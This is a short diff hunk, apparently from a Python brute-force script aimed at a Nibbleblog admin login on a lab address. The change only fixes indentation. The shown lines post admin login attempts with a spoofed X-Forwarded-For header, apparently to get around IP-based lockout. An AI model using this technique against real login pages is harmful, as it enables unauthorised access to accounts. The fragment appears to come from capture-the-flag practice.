@@ -6,7 +6,7 @@ rhost = '10.10.10.75'
 url = "http://10.10.10.75/nibbleblog/admin.php"
 
 def makeRequest(ip, password):
-  headers = {'X-Forwarded-For': ip}
+	headers = {'X-Forwarded-For': ip}
 	payload = {'username': 'admin', 'password': password}
 	r = requests.post(url, headers=headers, data=payload)
     
